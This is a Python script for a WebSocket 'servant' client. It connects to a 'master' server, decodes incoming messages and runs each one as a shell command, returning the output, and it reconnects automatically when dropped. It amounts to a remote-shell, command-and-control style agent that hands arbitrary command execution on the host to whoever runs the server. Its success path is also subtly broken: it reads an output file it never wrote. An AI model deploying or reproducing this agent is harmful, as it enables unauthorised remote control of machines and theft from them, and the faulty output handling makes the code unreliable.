import sys
sys.dont_write_bytecode = True
import argparse
import asyncio
import websockets
import subprocess
import os
import time
from decoder import decode_unicode_string

session = ""

async def connect_to_websocket(url, room, retry_interval):
    global session
    while True:
        try:
            uri = f"wss://{url}"
            if room:
                uri += f"/{room}"
            async with websockets.connect(uri) as websocket:
                await websocket.send(f"servant:{room}")

                while True:
                    message_from_master = await websocket.recv()

                    message_from_master = decode_unicode_string(message_from_master)
                    print("Received Command ", message_from_master)

                    if message_from_master.rstrip().strip() == "clear-session": 
                        session = ""
                        servant_response = "terminal session cleared"
                    else: 
                        session += f" && {message_from_master} "
                        print(f"executing {message_from_master}")
                        output_filename = "dump"

                        result = subprocess.run(message_from_master, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                        if result.returncode == 0:
                            print(f"Command executed successfully. Output saved to {output_filename}")
                            with open(output_filename) as output_file:
                                await websocket.send(output_file.read())
                        else:
                            with open(output_filename, "w") as output_file:
                                output_file.write(result.stdout)
                                output_file.write(result.stderr)
                            with open(output_filename, "r") as output_file:
                                await websocket.send(output_file.read())

        except websockets.exceptions.ConnectionClosed:
            print(f"Connection closed. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)

def parse_args():
    parser = argparse.ArgumentParser(description="WebSocket client with retrying and room support")
    parser.add_argument("--url", required=True, help="WebSocket server URL")
    parser.add_argument("--room", default="", help="Room identifier")
    parser.add_argument("--retry-interval", type=int, default=5, help="Retry interval in seconds")

    return parser.parse_args()

# Wrap your main logic in a function
async def main():
    args = parse_args()
    await connect_to_websocket(args.url, args.room, args.retry_interval)

# Run the event loop
if __name__ == "__main__":
    asyncio.run(main())
